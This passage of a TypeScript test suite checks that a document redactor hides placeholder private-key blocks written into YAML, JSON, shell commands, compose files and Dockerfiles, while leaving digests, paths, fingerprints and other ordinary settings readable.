    const out = redactDocument(doc('    x-note: -----BEGIN X-----', '    cap_add: [', '      ALL,', '      SYS_ADMIN', '    ]', '    devices: [', '      /dev/mapper/vg0/lvdata', '    ]'));
    for (const line of ['ALL,', 'SYS_ADMIN', '/dev/mapper/vg0/lvdata']) expect(out, line).toContain(line);
  });

  it('real blocks: headers by their names, JSON arrays, escaped line breaks, shell continuations', () => {
    hides(redactDocument(doc('-----BEGIN RSA PRIVATE KEY-----', 'Proc-Type: 4,ENCRYPTED', `DEK-Info: AES-128-CBC,${S}`, '', LINE, '-----END RSA PRIVATE KEY-----')));
    hides(redactDocument(doc('  k: |', '    -----BEGIN PGP PRIVATE KEY BLOCK-----', '    Version: GnuPG v2', `    Comment: ${S}`, '', `    ${LINE}`, '    =AbCd', '    -----END PGP PRIVATE KEY BLOCK-----')), LINE);
    hides(redactDocument(doc('{', '  "cert": [', '    "-----BEGIN PRIVATE KEY-----",', `    "${LINE}",`, '    "-----END PRIVATE KEY-----"', '  ]', '}')), LINE);
    hides(redactDocument(doc("    command: printf '%s\\n' \\", "      '-----BEGIN PRIVATE KEY-----' \\", `      '${LINE}' \\`, "      '-----END PRIVATE KEY-----' > /run/key.pem")), LINE);
    hides(redactDocument(doc('KEY=-----BEGIN PRIVATE KEY-----', LINE, '-----END PRIVATE KEY-----', 'OTHER=1')), LINE);
  });
});

/** Ninth pass: a key written one row per command, and what the diff notice counts. */
describe('ninth pass: a key written one row per command', () => {
  const ROW1 = 'MIIEs3cr3t0001AbCdEfGh0123456789+/AbCdEfGh0123456789+/AbCdEfGh01';
  const ROW2 = 'MIIEs3cr3t0002AbCdEfGh0123456789+/AbCdEfGh0123456789+/AbCdEfGh01';
  const TAIL = 'AbCd1111EfGh2222==';
  const hidesKey = (out: string): void => { for (const row of [ROW1, ROW2, TAIL]) hides(out, row); };

  it('in a command continued over several lines', () => {
    const out = redactDocument(doc(
      '    command: sh -c "echo \'-----BEGIN OPENSSH PRIVATE KEY-----\' > /root/.ssh/id &&',
      `      echo '${ROW1}' >> /root/.ssh/id &&`,
      `      echo '${ROW2}' >> /root/.ssh/id &&`,
      `      echo '${TAIL}' >> /root/.ssh/id &&`,
      '      echo \'-----END OPENSSH PRIVATE KEY-----\' >> /root/.ssh/id && exec app"',
      '    image: alpine:3.20',
    ));
    hidesKey(out);
    // The command around the rows stays readable.
    expect(out).toContain("echo '[REDACTED]' >> /root/.ssh/id &&");
    expect(out).toContain('>> /root/.ssh/id && exec app"');
    expect(out).toContain('image: alpine:3.20');
  });

  it('in a script (an entrypoint item, a config file) and in a Dockerfile', () => {
    const script = (indent: string): string[] => [
      `${indent}echo "-----BEGIN OPENSSH PRIVATE KEY-----" > /root/.ssh/id`,
      `${indent}echo "${ROW1}" >> /root/.ssh/id`,
      `${indent}echo "${ROW2}" >> /root/.ssh/id`,
      `${indent}echo "${TAIL}" >> /root/.ssh/id`,
      `${indent}echo "-----END OPENSSH PRIVATE KEY-----" >> /root/.ssh/id`,
      `${indent}exec app`,
    ];
    const entrypoint = redactDocument(doc('    entrypoint:', '      - sh', '      - -c', '      - |', ...script('        ')));
    hidesKey(entrypoint);
    const config = redactDocument(doc('configs:', '  init:', '    content: |', '      #!/bin/sh', ...script('      ')));
    hidesKey(config);
    expect(config).toContain('exec app');
    const dockerfile = redactDocument(doc('FROM alpine:3.20', 'RUN echo "-----BEGIN OPENSSH PRIVATE KEY-----" > /k && \\', `    echo "${ROW1}" >> /k && \\`, `    echo "${ROW2}" >> /k && \\`, '    echo "-----END OPENSSH PRIVATE KEY-----" >> /k', 'CMD ["app"]'));
    hides(dockerfile, ROW1);
    hides(dockerfile, ROW2);
    expect(dockerfile).toContain('CMD ["app"]');
  });

  it('a digest, a long path and a hex string after a text marker are not rows of a key', () => {
    const lines = [
      '    image: ghcr.io/org/app@sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef',
      '    volumes:',
      '      - /srv/data/projects/customer/application/storage/uploads/public:/data',
      '    x-fingerprint: 0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF',
    ];
    const out = redactDocument(doc('    x-note: -----BEGIN X-----', ...lines));
    for (const line of lines) expect(out, line).toContain(line);
  });
});
